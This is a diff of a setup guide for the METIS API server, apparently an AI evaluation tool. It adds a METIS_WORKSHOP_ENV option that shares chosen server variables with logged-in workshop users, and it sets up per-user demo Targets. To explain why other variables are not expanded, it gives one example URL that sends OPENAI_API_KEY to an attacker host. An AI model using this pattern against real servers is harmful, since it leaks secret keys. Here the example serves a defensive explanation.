@@ -442,9 +442,12 @@ The API reads the `HOST` variable to know its address. Start the API with `metis
 listens on that same address. If you start Uvicorn directly with a `--host` option, also set
 `HOST` to that address, or the live check can be on for a server that other computers can reach.
 
-The API never puts a value from its own environment into a URL that it requests. Otherwise a
-client could send `https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A
-`spec_url` or `start_url` that names a `${NAME}` variable is not requested: its probe says so, and
+The API puts a value from its own environment into a URL that it requests only for a variable
+that `METIS_WORKSHOP_ENV` names. Each user account can already read those values. See
+[Turn on login for a shared server](#turn-on-login-for-a-shared-server). The API expands no
+other variable. Otherwise a client could send
+`https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A `spec_url` or
+`start_url` that names any other `${NAME}` variable is not requested: its probe says so, and
 `status` is `unchecked`. To check that URL, run `metis wizard connect` on the computer that has
 the variables.
 
@@ -605,8 +608,25 @@ Both are optional. Make each with a tool such as `openssl rand -hex 32`.
 neither. At each start, the API makes this user account or sets its password. Login has no limit
 on the number of tries, so use a long random password.
 
+Participants can also use the METIS CLI on their own computers. For this, they need some
+values of the server, such as the Langfuse keys of the target. Name these variables in
+`METIS_WORKSHOP_ENV`, separated by commas:
+
+```bash
+METIS_WORKSHOP_ENV=LANGFUSE_PUBLIC_KEY,LANGFUSE_SECRET_KEY,LANGFUSE_BASE_URL
+```
+
+The API reads their values at startup, also from `.env`. `GET /api/v1/workshop/env` returns each
+variable that has a value, in the same order, and the web app shows them as `.env` lines under
+**CLI settings** in the account menu. Without `METIS_WORKSHOP_ENV`, the route returns 404
+`not_found`. The live connection check also puts these values into a `spec_url` or `start_url`
+that names them, such as `${TOYAPP_API_URL}/openapi.json` for the demo Target. Each user account
+with a login session can read these values. List only values for participants. Never list a model provider key or a `METIS_` variable.
+
 The API does not start when one of these variables is set and `METIS_LOGIN` is not `1`, when the
-two tokens are the same, or when only one of the two admin variables is set.
+two tokens are the same, when only one of the two admin variables is set, or when
+`METIS_WORKSHOP_ENV` has a name that is not a variable name, a name that starts with `METIS_`,
+or a name more than one time.
 
 When login is on, each route under `/api` needs a login session. A request without one gets 401
 `login_required`. The exceptions are `POST /api/v1/auth/login`, `POST /api/v1/auth/logout`,
@@ -675,6 +695,23 @@ The join token cannot list, reset, or delete user accounts, and it cannot read r
 thus give it to each participant, and a website that gives credentials to its visitors can hold
 it on its server. That website must decide who gets a user account, and how many. The admin token
 opens only the user routes. Keep it for your own scripts.
+
+Each new user account gets its own demo Target, the Northstar Policy & Report Assistant, with
+a done Interview and one finished Experiment. See
+[The demo Target](web.md#the-demo-target). A user account that exists before the server has
+this feature does not get one. For a workshop, set up the server before you make the user
+accounts:
+
+- Run the [agentic-eval toy app](https://github.com/govtech-responsibleai/agentic-eval-toyapp)
+  where the server can reach it, and set `TOYAPP_API_URL` to its address, for example
+  `http://127.0.0.1:8000`. The Target binding of the demo reads this variable. The checks of
+  `metis doctor` do not read it, so a server without it shows **Server ready** and the
+  experiment fails when it starts.
+- Set the model keys and the Langfuse keys that an experiment needs. See the
+  [Engine guide](../engine.md).
+
+A person can read the finished Experiment of the demo without these settings. Only a new
+experiment needs them.
 
 ### Records of each user account
 
